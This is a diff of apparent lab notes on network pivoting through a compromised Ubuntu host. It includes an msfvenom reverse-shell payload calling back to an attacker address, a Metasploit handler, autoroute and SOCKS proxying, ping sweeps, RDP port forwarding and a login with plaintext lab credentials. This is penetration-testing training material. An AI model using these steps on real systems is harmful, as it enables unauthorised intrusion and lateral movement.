@@ -1007,54 +1007,266 @@ flowchart LR
 In some scenarios, we may already have Meterpreter shell access on the Ubuntu server (the pivot host) and want to perform enumeration scans through it while still benefiting from the conveniences that Meterpreter sessions provide. In these cases, we can create a pivot directly through the Meterpreter session without relying on SSH port forwarding.
 
 <details>
-<summary><h2>1. Configuring & Starting the multi/handler</h2></summary>
+<summary><h2>Method 1. Using a Meterpreter Session</h2></summary>
+
+<details>
+<summary><h3>1. Configuring & Starting the multi/handler</h3></summary>
 
 We can generate a Meterpreter shell for the Ubuntu server, which will give us a shell on our attack host listening on port 8080.
 
 ```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f elf -o shell.elf
 ```
 ```bash
 # [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 # [-] No arch selected, selecting arch: x64 from the payload
 # No encoder specified, outputting raw payload
-# Payload size: 130 bytes
-# Final size of elf file: 250 bytes
-# Saved as: backupjob
+# Payload size: 1121480 bytes
+# Final size of elf file: 1121480 bytes
+# Saved as: shell.elf
 ```
 
-Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.
+**Transfer the Payload to the Pivot Host**
 
 ```bash
-msf6 > use exploit/multi/handler
-# [*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set lhost 0.0.0.0
-# lhost => 0.0.0.0
-msf6 exploit(multi/handler) > set lport 8080
-# lport => 8080
-msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
-# payload => linux/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > run
-# [*] Started reverse TCP handler on 0.0.0.0:8080 
+scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
+```
+```bash
+# ubuntu@10.129.202.64's password: 
+# shell.elf    
 ```
 
-We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.
+Before executing the payload over, we can start a Metasploit multi/handler, also known as a Generic Payload Handler.
+
+```bash
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload linux/x64/meterpreter_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x64/meterpreter_reverse_tcp
+# payload => linux/x64/meterpreter_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.40
+# LHOST => 10.10.14.40
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
+# LPORT => 4444
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+# [*] Started reverse TCP handler on 10.10.14.40:4444 
+```
+
+**Execute the Payload on the Pivot Host**
 
 ```bash
 ubuntu@WebServer:~$ ls
-#backupjob
-ubuntu@WebServer:~$ chmod +x backupjob 
-ubuntu@WebServer:~$ ./backupjob
+# shell.elf
+chmod +x shell.elf
+./shell.elf
 ```
 
-We need to make sure the Meterpreter session is successfully established upon executing the payload.
+**Confirm the Meterpreter Session back in the MSFCONSOLE**
 
 ```bash
-# [*] Sending stage (3020772 bytes) to 10.129.202.64
-# [*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2025-11-20 12:27:43 -0500
-meterpreter > pwd
-# /home/ubuntu
+# [*] Meterpreter session 1 opened (10.10.14.40:4444 -> 10.129.202.64:36500) at 2025-11-27 18:44:12 -0600
 ```
+
+**Check interfaces**
+
+```bash
+
+(Meterpreter 1)(/home/ubuntu) > ifconfig
+
+# Interface  1
+# ============
+# Name         : lo
+# Hardware MAC : 00:00:00:00:00:00
+# MTU          : 65536
+# Flags        : UP,LOOPBACK
+# IPv4 Address : 127.0.0.1
+# IPv4 Netmask : 255.0.0.0
+# IPv6 Address : ::1
+# IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
+
+
+# Interface  2
+# ============
+# Name         : ens192
+# Hardware MAC : 00:50:56:b0:15:2d
+# MTU          : 1500
+# Flags        : UP,BROADCAST,MULTICAST
+# IPv4 Address : 10.129.202.64
+# IPv4 Netmask : 255.255.0.0
+# IPv6 Address : dead:beef::250:56ff:feb0:152d
+# IPv6 Netmask : ffff:ffff:ffff:ffff::
+# IPv6 Address : fe80::250:56ff:feb0:152d
+# IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+
+# Interface  3
+# ============
+# Name         : ens224
+# Hardware MAC : 00:50:56:b0:42:50
+# MTU          : 1500
+# Flags        : UP,BROADCAST,MULTICAST
+# IPv4 Address : 172.16.5.129
+# IPv4 Netmask : 255.255.254.0
+# IPv6 Address : fe80::250:56ff:feb0:4250
+# IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+(Meterpreter 1)(/home/ubuntu) > background
+# [*] Backgrounding session 1...
+[msf](Jobs:1 Agents:1) exploit(multi/handler) >> sessions
+
+# Active sessions
+# ===============
+
+#   Id  Name  Type                   Information             Connection
+#   --  ----  ----                   -----------             ----------
+#   1         meterpreter x64/linux  ubuntu @ 10.129.202.64  10.10.14.40:4444 -> 10.129.202.64:36500 (10.129.202.64)
+```
+
+</details>
+
+<details>
+<summary><h3>2. Automatically Adding Routes with Autoroute</h3></summary>
+
+```bash
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute
+# [*] Using configured payload linux/x64/meterpreter_reverse_tcp
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
+# SESSION => 1
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run
+# [*] Running module against 10.129.202.64 (10.129.202.64)
+# [*] Searching for subnets to autoroute.
+# [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+# [+] Route added to subnet 172.16.4.0/255.255.254.0 from host's routing table.
+# [*] Post module execution completed
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run autoroute -s 172.16.5.0/23
+# [*] Running module against 10.129.202.64 (10.129.202.64)
+# [*] Searching for subnets to autoroute.
+# [*] Did not find any new subnets to add.
+# [*] Post module execution completed
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> route print
+
+# IPv4 Active Routing Table
+# =========================
+
+#    Subnet             Netmask            Gateway
+#    ------             -------            -------
+#    10.129.0.0         255.255.0.0        Session 1
+#    172.16.4.0         255.255.254.0      Session 1
+
+# [*] There are currently no IPv6 routes defined.
+```
+
+</details>
+
+<details>
+<summary><h3>3. Starting the SOCKS Proxy</h3></summary>
+
+This allows external tools (proxychains, nmap, etc.) to pivot through Meterpreter.
+
+**Start the SOCKS Proxy Server**
+
+```bash
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use auxiliary/server/socks_proxy
+# [*] Using configured payload linux/x64/meterpreter_reverse_tcp
+[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVHOST 127.0.0.1
+# SRVHOST => 127.0.0.1
+[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVPORT 1080
+# SRVPORT => 1080
+[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
+# [*] Auxiliary module running as background job 0.
+[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> 
+# [*] Starting the SOCKS proxy server
+
+#NOTE: PRESS ENTER TO KEEP USING THE CONSOLE
+```
+
+</details>
+
+<details>
+<summary><h3>4. Updating proxychains.conf (If Needed)</h3></summary>
+
+Once the SOCKS server is running, we can route traffic from tools like **Nmap** through our pivot on the compromised Ubuntu host using **proxychains**. To enable this, we add the following entry to the end of the `/etc/proxychains.conf` file (if it is not already present):
+
+```bash
+grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
+```
+
+</details>
+
+<details>
+<summary><h3>5. Scanning Internal Hosts via Meterpreter</h3></summary>
+
+**Ping Sweep using Meterpreter**
+
+```bash
+[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1
+# [*] Starting interaction with 1...
+
+(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+# [*] Performing ping sweep for IP range 172.16.5.0/23
+
+# [+] 	172.16.5.19 host found
+# [+] 	172.16.5.129 host found
+```
+
+</details>
+
+<details>
+<summary><h3>6. Port Forwarding (Pivoting RDP Through Meterpreter)</h3></summary>
+
+**Create a Local Port Forward**
+
+```bash
+(Meterpreter 1)(/home/ubuntu) > portfwd add -l 3389 -p 3389 -r 172.16.5.19
+[*] Forward TCP relay created: (local) :3389 -> (remote) 172.16.5.19:3389
+```
+
+**Verify Forwarding with netcat**
+
+```bash
+nc -v 127.0.0.1 3389
+```
+```bash
+# localhost [127.0.0.1] 3389 (ms-wbt-server) open
+```
+
+</details>
+
+<details>
+<summary><h3>7. Connecting to the Internal Windows Host via RDP</h3></summary>
+
+**Use xfreerdp:**
+
+```bash
+xfreerdp /v:localhost /u:victor /p:pass@123
+```
+```bash
+# [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-1640397/.config/freerdp
+# [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-1640397/.config/freerdp/certs]
+# [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-1640397/.config/freerdp/server]
+# [19:43:11:993] [49955:49956] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+# [19:43:11:993] [49955:49956] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.local
+# [19:43:11:994] [49955:49956] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - The hostname used for this connection (localhost:3389) 
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - Common Name (CN):
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - 	DC01.inlanefreight.local
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
+# Certificate details for localhost:3389 (RDP-Server):
+# 	Common Name: DC01.inlanefreight.local
+# 	Subject:     CN = DC01.inlanefreight.local
+# 	Issuer:      CN = DC01.inlanefreight.local
+# 	Thumbprint:  ef:53:77:2b:04:31:f8:1a:2e:45:4a:8f:f9:9e:74:58:da:da:59:90:87:27:dc:dc:28:19:fc:65:c4:73:54:f9
+# The above X.509 certificate could not be verified, possibly because you do not have
+# the CA certificate in your certificate store, or the certificate has expired.
+# Please look at the OpenSSL documentation on how to add a private CA to the store.
+# Do you trust the above certificate? (Y/T/N) y
+```
+
+Once accepted, you will gain full RDP access to the internal host.
+
+</details>
 
 </details>
 
@@ -1065,26 +1277,61 @@ We know the Windows target resides in the **172.16.5.0/23** network. If its fire
 
 **Ping Sweep using Meterpreter**
 ```bash
-meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
-```
-```bash
-[*] Performing ping sweep for IP range 172.16.5.0/23
+[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1
+# [*] Starting interaction with 1...
+
+(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+# [*] Performing ping sweep for IP range 172.16.5.0/23
+
+# [+] 	172.16.5.19 host found
+# [+] 	172.16.5.129 host found
 ```
 
 **Ping Sweep For Loop on Linux Pivot Hosts**
 ```bash
 for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
 ```
+```bash
+# 64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.233 ms
+# 64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.030 ms
+```
 
 **Ping Sweep For Loop Using CMD**
-```bash
+```cmd
 for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 ```
+```cmd
+...
+
+ping 172.16.5.19 -n 1 -w 100   | find "Reply"
+Reply from 172.16.5.19: bytes=32 time<1ms TTL=128
+
+...
+
+ping 172.16.5.129 -n 1 -w 100   | find "Reply"
+Reply from 172.16.5.129: bytes=32 time<1ms TTL=64
+
+...
+```
+
 
 **Ping Sweep Using PowerShell**
-```bash
+```powershell
 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
 ```
+```powershell
+...
+172.16.5.18: False
+172.16.5.19: True
+172.16.5.20: False
+...
+172.16.5.128: False
+172.16.5.129: True
+172.16.5.130: False
+...
+```
+
+
 
 > **NOTE:** It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.
 
@@ -1146,8 +1393,19 @@ msf6 auxiliary(server/socks_proxy) > jobs
 **Adding a Line to proxychains.conf if Needed**
 
 Once the SOCKS server is running, we can route traffic from tools like **Nmap** through our pivot on the compromised Ubuntu host using **proxychains**. To enable this, we add the following entry to the end of the `/etc/proxychains.conf` file (if it is not already present):
+
 ```bash
-grep -qxF "socks4 127.0.0.1 9050" /etc/proxychains.conf || echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains.conf
+grep -qxF "socks4 127.0.0.1 9050" /etc/proxychains.conf || echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
+```
+
+**Permforming an Nmap scan**
+```bash
+proxychains nmap -sT -Pn 172.16.5.0/23
+```
+```bash
+# [proxychains] config file found: /etc/proxychains.conf
+# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+# Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-27 19:05 CST
 ```
 
 > **NOTE:** Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
@@ -1160,19 +1418,20 @@ grep -qxF "socks4 127.0.0.1 9050" /etc/proxychains.conf || echo "socks4 127.0.0.
 Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
 
 ```bash
-msf6 > use post/multi/manage/autoroute
-msf6 post(multi/manage/autoroute) > set SESSION 1
+[msf](Jobs:1 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute
+[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
 # SESSION => 1
-msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> set SUBNET 172.16.5.0
 # SUBNET => 172.16.5.0
-msf6 post(multi/manage/autoroute) > run
-# [!] SESSION may not be compatible with this module:
-# [!]  * incompatible session platform: linux
-# [*] Running module against 10.129.202.64
+[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> set NETMASK 255.255.254.0
+# NETMASK => 255.255.254.0
+[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> run
+# [*] Running module against 10.129.202.64 (10.129.202.64)
 # [*] Searching for subnets to autoroute.
 # [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
-# [+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
+# [+] Route added to subnet 172.16.4.0/255.255.254.0 from host's routing table.
 # [*] Post module execution completed
+[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> 
 ```
 
 It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
